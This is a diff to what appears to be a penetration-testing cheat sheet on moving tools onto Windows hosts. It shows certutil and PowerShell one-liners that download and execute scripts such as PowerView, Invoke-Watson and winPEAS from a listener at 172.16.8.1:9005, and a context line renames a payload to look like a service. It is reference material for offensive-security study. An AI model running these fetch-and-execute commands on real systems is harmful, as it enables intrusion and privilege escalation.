@@ -35,15 +35,12 @@ ren Payload.exe Service.exe
 
 {% code overflow="wrap" %}
 ```powershell
-# using certutil
+# CMD: certutil
 certutil -urlcache -split -f https://example.com/example.txt example.txt
-# using powershell Invoke-WebRequest
+# Powershell: Invoke-WebRequest
 iwr -Uri "http://172.16.8.1:9005/PowerView.ps1" -O "PowerView.ps1"
-# Download and Execute script
+# Powershell: Invoke-Expression
 iex ((New-Object Net.WebClient).DownloadString("http://172.16.8.1:9005/Invoke-Watson.ps1"))
-# or
-$watson_exec = [System.Text.Encoding]::UTF8.GetString((iwr -Uri "http://172.16.8.1:9005/Invoke-Watson.ps1" -UseBasicParsing).Content)
-iex $watson_exec
 ```
 {% endcode %}
 
@@ -54,9 +51,6 @@ iex $watson_exec
 {% code overflow="wrap" %}
 ```powershell
 iex ((New-Object Net.WebClient).DownloadString("http://172.16.8.1:9005/Invoke-winPEAS.ps1"))
-# or
-$winpeas_ps1 = [System.Text.Encoding]::UTF8.GetString((iwr -Uri "http://172.16.8.1:9005/Invoke-winPEAS.ps1" -UseBasicParsing).Content)
-iex $winpeas_ps1
 ```
 {% endcode %}
 
